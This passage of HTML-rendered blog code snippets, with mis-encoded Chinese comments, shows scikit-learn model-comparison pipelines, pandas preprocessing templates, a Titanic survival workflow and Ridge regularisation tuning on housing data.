class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## å›å½’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### å›å½’OneKey</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> HuberRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoLars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> PassiveAggressiveRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> RANSACRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;rfr&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;gbr&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;lasso&#x27;</span>] = Lasso()</span><br><span class="line">    models[<span class="string">&#x27;ridge&#x27;</span>] = Ridge()</span><br><span class="line">    models[<span class="string">&#x27;en&#x27;</span>] = ElasticNet()</span><br><span class="line">    models[<span class="string">&#x27;huber&#x27;</span>] = HuberRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lars&#x27;</span>] = Lars()</span><br><span class="line">    models[<span class="string">&#x27;llars&#x27;</span>] = LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;pa&#x27;</span>] = PassiveAggressiveRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    models[<span class="string">&#x27;ranscac&#x27;</span>] = RANSACRegressor()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"> </span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> pipeline</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross_validation</span>(<span class="params">pipeline,X,Y</span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">10</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validation</span>(<span class="params">pipeline,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">    pipeline.fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    pipeline = make_pipeline(model)</span><br><span class="line">    <span class="comment"># dic[name] = cross_validation(pipeline,Xtrain,Ytrain)</span></span><br><span class="line">    dic[name] = validation(pipeline,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps).fit(Xtrain,Ytrain)</span><br><span class="line"><span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="æ¨¡æ¿">æ¨¡æ¿</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æå–è¿ç»­ï¼Œç¦»æ•£çš„æ•°æ®</span></span><br><span class="line">col = df.columns.tolist()</span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line"> Â  Â col.remove(i)</span><br><span class="line"><span class="comment"># è½¬æ¢</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>] = df[<span class="string">&#x27;a&#x27;</span>].replace(<span class="string">&#x27;[\$,)]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,regex=<span class="literal">True</span>).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="comment"># ç¦»æ•£ä¸€èˆ¬å¡«ä¼—æ•°ï¼Œè¿ç»­å¡«å‡å€¼</span></span><br><span class="line">df[<span class="string">&#x27;b&#x27;</span>]=df[<span class="string">&#x27;b&#x27;</span>].fillna(df.b.mean())</span><br><span class="line">df[<span class="string">&#x27;c&#x27;</span>]=df[<span class="string">&#x27;c&#x27;</span>].fillna(df.b.mode()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># å“‘å˜é‡æ“ä½œ</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">cate</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡æ“ä½œ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTitle</span>(<span class="params">name</span>):</span><br><span class="line">    str1=name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]   <span class="comment">#å–å¤´è¡”.å§“</span></span><br><span class="line">    str2=str1.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]   <span class="comment">#å–å¤´è¡”</span></span><br><span class="line">    <span class="comment">#strip() ç§»é™¤å­—ç¬¦ä¸²å¤´å°¾æŒ‡å®šçš„å­—ç¬¦</span></span><br><span class="line">    str3=str2.strip()</span><br><span class="line">    <span class="keyword">return</span> str3</span><br><span class="line">titleDf = pd.DataFrame()</span><br><span class="line"><span class="comment">#mapæ–¹æ³•---å¯¹seriesé‡Œé¢æ¯ä¸ªæ•°æ®åº”ç”¨è‡ªå®šä¹‰å‡½æ•°è®¡ç®—</span></span><br><span class="line">titleDf[<span class="string">&#x27;Title&#x27;</span>] = full[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(getTitle)</span><br><span class="line"><span class="comment"># æ ¹æ®å…¶ä»–åˆ—æ•°æ®æ–°å»ºonehot</span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">familyDf = pd.DataFrame()</span><br><span class="line">familyDf[<span class="string">&#x27;FamilySize&#x27;</span>] = full[<span class="string">&#x27;Parch&#x27;</span>]+full[<span class="string">&#x27;SibSp&#x27;</span>]+<span class="number">1</span></span><br><span class="line">familyDf[<span class="string">&#x27;Family_Single&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Small&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span>&lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Large&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span>&lt;= s <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç›¸å…³æ€§</span></span><br><span class="line">corrDf = full.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ³°å¦å°¼å…‹">æ³°å¦å°¼å…‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">train = pd.read_csv(<span class="string">&#x27;train.csv&#x27;</span>)</span><br><span class="line">test = pd.read_csv(<span class="string">&#x27;test.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">train.head()</span><br><span class="line"></span><br><span class="line">train.info()</span><br><span class="line"></span><br><span class="line">train.describe([<span class="number">0.01</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line"></span><br><span class="line">train.isna().<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line">train.Age.fillna(train.Age.mean(),inplace=<span class="literal">True</span>)</span><br><span class="line">train[<span class="string">&#x27;Embarked&#x27;</span>].fillna(train.Embarked.mode()[<span class="number">0</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train.Cabin.fillna(<span class="string">&#x27;Unknown&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.set_index(<span class="string">&#x27;PassengerId&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;FamilySize&#x27;</span>] = train[<span class="string">&#x27;SibSp&#x27;</span>]+train[<span class="string">&#x27;Parch&#x27;</span>]+<span class="number">1</span></span><br><span class="line">train.drop([<span class="string">&#x27;SibSp&#x27;</span>,<span class="string">&#x27;Parch&#x27;</span>],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin = train.Cabin.<span class="built_in">map</span>(<span class="keyword">lambda</span> x : x[<span class="number">0</span>])</span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]).value_counts()</span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>]=train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">train.drop(<span class="string">&#x27;Ticket&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">col = train.columns[train.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">col</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> col:</span><br><span class="line">    train = pd.concat([train,pd.get_dummies(train[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    train.drop(c,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">corrDf = train.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">Ytrain = train[<span class="string">&#x27;Survived&#x27;</span>]</span><br><span class="line">Xtrain = train.drop(<span class="string">&#x27;Survived&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,  SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;gbc&#x27;</span>] = GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;rfc&#x27;</span>] = RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lsvc&#x27;</span>] =LinearSVC()</span><br><span class="line">    models[<span class="string">&#x27;svc&#x27;</span>] = SVC()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3><span id="è°ƒä¼˜">è°ƒä¼˜</span></h3><p>å²­å›å½’å¯ä»¥è§£å†³ç‰¹å¾é—´çš„ç²¾ç¡®ç›¸å…³å…³ç³»å¯¼è‡´çš„æœ€å°äºŒä¹˜æ³•æ— æ³•ä½¿ç”¨çš„é—®é¢˜ï¼Œè€ŒLassoä¸è¡Œã€‚</p><p>ç”±äºLassoå¯¹æ­£åˆ™åŒ–ç³»æ•°çš„å˜åŠ¨è¿‡äºæ•æ„Ÿï¼Œå› æ­¤æˆ‘ä»¬å¾€å¾€è®© åœ¨å¾ˆå°çš„ç©ºé—´ä¸­å˜åŠ¨</p><h3><span id="ridge">Ridge</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">housevalue = fch()</span><br><span class="line">X = pd.DataFrame(housevalue.data) y = housevalue.target</span><br><span class="line">X.columns = [<span class="string">&quot;ä½æˆ·æ”¶å…¥ä¸­ä½æ•°&quot;</span>,<span class="string">&quot;æˆ¿å±‹ä½¿ç”¨å¹´ä»£ä¸­ä½æ•°&quot;</span>,<span class="string">&quot;å¹³å‡æˆ¿é—´æ•°ç›®&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  ,<span class="string">&quot;å¹³å‡å§å®¤æ•°ç›®&quot;</span>,<span class="string">&quot;è¡—åŒºäººå£&quot;</span>,<span class="string">&quot;å¹³å‡å…¥ä½ç‡&quot;</span>,<span class="string">&quot;è¡—åŒºçš„çº¬åº¦&quot;</span>,<span class="string">&quot;è¡—åŒºçš„ç»åº¦&quot;</span>]</span><br><span class="line">Ridge_ = RidgeCV(alphas=np.arange(<span class="number">1</span>,<span class="number">1001</span>,<span class="number">100</span>)</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="comment">#,scoring=&quot;neg_mean_squared_error&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  ,store_cv_values=<span class="literal">True</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="comment">#,cv=5</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(X, y)</span><br><span class="line"></span><br><span class="line">Ridge_.score(X,y) <span class="comment">#è°ƒç”¨æ‰€æœ‰äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line">Ridge_.cv_values_.shape</span><br><span class="line"><span class="comment">#è¿›è¡Œå¹³å‡åå¯ä»¥æŸ¥çœ‹æ¯ä¸ªæ­£åˆ™åŒ–ç³»æ•°å–å€¼ä¸‹çš„äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line">Ridge_.cv_values_.mean(axis=<span class="number">0</span>) <span class="comment">#æŸ¥çœ‹è¢«é€‰æ‹©å‡ºæ¥çš„æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°</span></span><br><span class="line">Ridge_.alpha_</span><br></pre></td></tr></table></figure><h3><span id="lasso">Lasso</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 